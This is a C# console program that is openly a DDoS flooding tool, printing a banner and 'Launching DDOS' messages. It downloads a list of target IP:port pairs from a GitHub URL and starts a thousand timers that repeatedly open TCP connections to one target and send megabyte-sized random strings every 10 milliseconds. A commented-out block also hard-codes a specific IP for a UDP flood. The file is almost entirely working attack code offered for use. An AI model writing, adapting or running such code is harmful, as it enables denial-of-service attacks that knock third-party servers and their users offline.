using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace WindowsFormsApp13
{
    class Class1
    {
        private static Random random = new Random();
        private static string RandomString(int length)
        {
            const string pool = "abcdefghijklmnopqrstuvwxyz012!@#$%^&*()_+-=}{[]\';/. `~3456789";
            var builder = new StringBuilder();

            for (var i = 0; i < length; i++)
            {
                var c = pool[random.Next(0, pool.Length)];
                builder.Append(c);
            }

            return builder.ToString();
        }
        public static List<string> strrs = new List<string>();
        public static List<System.Timers.Timer> tmres = new List<System.Timers.Timer>();
       public static int op = 0;
        private static void kk()
        {
            string sss = "";
            if (op == 0)
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine("                %########%          %########%                                  " + "\n");
                Console.WriteLine("             ################    ################                               " + "\n");
                Console.WriteLine("           %#######################################                             " + "\n");
                Console.WriteLine("          .########################################*                            " + "\n");
                Console.WriteLine("          (#############Made by Micegan############(                            " + "\n");
                Console.WriteLine("          .########################################,                            " + "\n");
                Console.WriteLine("           ########################################                             " + "\n");
                Console.WriteLine("            #######Made with pure love love ######                              " + "\n");
                Console.WriteLine("              ##################################                                " + "\n");
                Console.WriteLine("                ##############################                                  " + "\n");
                Console.WriteLine("                   ########################.                                    " + "\n");
                Console.WriteLine("                     ,##################,                                       " + "\n");
                Console.WriteLine("                        ,############*                                          " + "\n");
                Console.WriteLine("                           /######(                                             " + "\n");
                Console.WriteLine("                              ##                                                " + "\n");

                Console.ForegroundColor = ConsoleColor.Green;
                Thread.Sleep(2000);
                Console.WriteLine("Press Enter while holding window active to close the application");
                Console.WriteLine("300 sent sockets per 10 milisecods");
                Console.WriteLine("5 domains/ips per 1 thread (launched program) to not squish your potato, it's already too much, lol");
                Console.WriteLine("thread sleeps 10 milisecods per 1 socket send (depends on your's potato power)");
                Console.WriteLine("-----------------------------------------------------------------------------------------------------");
                Thread.Sleep(1000);
                
            }
            Console.WriteLine("Searching for an ips list");
            if (op == 0)
            {
                Thread.Sleep(1000);
            }
            WebClient wc = new WebClient();
            try
            {
               sss = wc.DownloadString("https://raw.githubusercontent.com/micegan/NotRussianDodosPureGold/main/ippsssdas.txt");

                char[] slit = { '\n' };

                strrs = sss.Split(slit).ToList();
                if (op == 0)
                {
                    Thread.Sleep(1000);
                    op = 1;
                }
                Console.WriteLine("Launching DDOS, your pottato aling with few servers is about to cry.");
                Console.WriteLine("------------------------------------------------------------------------------");

                Console.WriteLine("------------------------------------------------------------------------------");
                for (int i = 0; i < 1; i++)
                {
                    
                        Random rnd = new Random();
                        int pos = rnd.Next(0, strrs.Count());
                        Console.WriteLine(strrs[pos].ToString());
                        
                        string ip = strrs[pos].Split(new char[] { ':' })[0];
                        int port = int.Parse(strrs[pos].Split(new char[] { ':' })[1]);
                    for (int dx = 0; dx < 1000; dx++)
                    {
                        var ddo = dos(ip, port);
                        tmres.Add(ddo);
                    }
                }
                Console.WriteLine("------------------------------------------------------------------------------");


            }
            catch {
                Console.WriteLine("No acces to the website with ip lists, probably no internet connection else check this twitter for more info: https://twitter.com/MiceganA");
            }



            int x = 0;
            /* do
             {
                 {
                     string text = RandomString(10000);
                     string IP, dots = "...", txtFile;
                     int port = 36565;
                     Console.WriteLine("Write File:");
                     txtFile = @"C:\Users\User\source\repos\WindowsFormsApp13\WindowsFormsApp13\TextFile1.txt";
                     IP = "134.249.159.120";
                     ///try
                    /// {
                         ///  using (StreamReader sr = new StreamReader(txtFile))
                         ///  {
                         ///      text = sr.ReadToEnd();
                         //  }
                   ///  }
                   ///  catch
                  ///   {
                  ///       Console.WriteLine("error");
                  ///   }
                     string byt = "Gerooooooooooooooooooooooooooooolf Loooooooooooooooooooooooooooooox";
                     byte[] packetData = new ASCIIEncoding().GetBytes(text);
                     IPEndPoint ep = new IPEndPoint(IPAddress.Parse(IP), port);
                   //  Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Udp);
                     Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Udp);
                     try
                     {

                         client.SendTo(packetData, ep);
                     }
                     catch (System.Exception syex)
                     {
                         Console.WriteLine("Problem");
                     }
                 }
             } while (x < 5);*/

            Console.Read();
        }

        public static System.Timers.Timer dos(string IP, int port) {
            int x = 0;

            System.Timers.Timer tim = new System.Timers.Timer();
            tim.Interval = 10;
            tim.Start();

            tim.Elapsed += (e, u) =>
            {
                tim.Stop();
               
                 {
                     string text = RandomString(1000000);



                     byte[] packetData = new ASCIIEncoding().GetBytes(text);
                     IPEndPoint ep = new IPEndPoint(IPAddress.Parse(IP), port);
                     Socket socket = new Socket(SocketType.Stream, ProtocolType.IP);
                     try
                     {
                         socket.Connect(ep);

                         socket.SendTo(packetData, ep);
                         tim.Start();

                         Console.WriteLine("IP:" + IP + " packets send. Packet size (bytes count: " + packetData.Length + ")");
                     }
                     catch (System.Exception syex)
                     {
                         Console.WriteLine("IP:" + IP + " can not acces. Try relaunching program if all 5 ips listed!");
                         Console.WriteLine("Keeping you back");
                         
                       /* for (int m = 0; m < tmres.Count - 1; m++) {
                            tmres[m].Stop();
                           
                        }
                        tmres.Clear();
                        kk();*/

                    }
                 }

             };
            return tim;
        }


        static void Main(string[] args)
        {
            kk();
        }
    }
}
